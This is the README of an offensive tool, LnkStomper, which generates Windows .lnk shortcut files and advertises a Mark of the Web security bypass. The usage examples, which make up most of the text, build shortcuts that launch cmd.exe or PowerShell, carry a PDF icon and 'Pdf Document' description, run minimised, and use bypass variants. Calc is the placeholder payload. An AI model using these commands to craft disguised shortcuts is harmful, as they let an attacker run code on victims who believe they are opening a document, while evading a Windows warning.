
## 🔥 `LnkStomper with MOTW BYPASS` 🔥

* Windows (.lnk) Shortcut file generator that bypass MOTW

## About
CLI tool that automates the process of generating Windows (.lnk) files

## Features 
- 🔥 `Mark Of The Web (MOTW) Bypass`


## Installation

```
git clone  
```

```
pip install -r requirements.txt
```

## Usage Examples
```
python LnkStomper.py -h

python LnkStomper.py --example

python LnkStomper.py --lnk calc.lnk

python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c start calc.exe" -o calc.lnk

python lnkstomper.py --target C:\Windows\System32\cmd.exe --arguments "/c powershell.exe -c calc" --icon pdf --output calc.lnk          

python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c powershell.exe -c start calc" -o calc.lnk -i pdf -d "Pdf Document" -w min

python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c powershell.exe -c start calc" -o calc.lnk  -w min -i "%SystemRoot%\System32\shell32.dll,267"

python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c start calc.exe" -o calc.lnk -v dot

python LnkStomper.py -t "C:\Windows\System32\cmd.exe" -a "/c start calc.exe" -o calc.lnk -v pathsegent
```


## License
This is an open-source software licensed under the [MIT license](https://opensource.org/licenses/MIT)